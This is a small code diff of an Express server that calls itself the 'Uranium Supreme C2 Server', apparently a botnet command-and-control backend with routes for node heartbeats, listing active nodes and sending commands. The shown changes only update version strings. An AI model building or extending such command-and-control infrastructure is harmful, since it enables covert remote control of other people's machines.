@@ -32,7 +32,7 @@ app.post('/node/pulse', (req, res) => {
 
 app.get('/nodes', (req, res) => {
     res.json({
-        empire: "مملكة ناصر دين الله الكلعي - Uranium Supreme v8.0",
+        empire: "مملكة ناصر دين الله الكلعي - Uranium Supreme v8.1 Ultimate",
         activeCount: Object.keys(activeNodes).length,
         nodes: activeNodes
     });
@@ -49,7 +49,7 @@ app.get('/send-cmd', (req, res) => {
 });
 
 app.get('/', (req, res) => {
-    res.send("<h1>[⚡] Uranium Supreme C2 Server v8.0 Online</h1>");
+    res.send("<h1>[⚡] Uranium Supreme C2 Server v8.1 Online</h1>");
 });
 
 app.listen(PORT, () => {
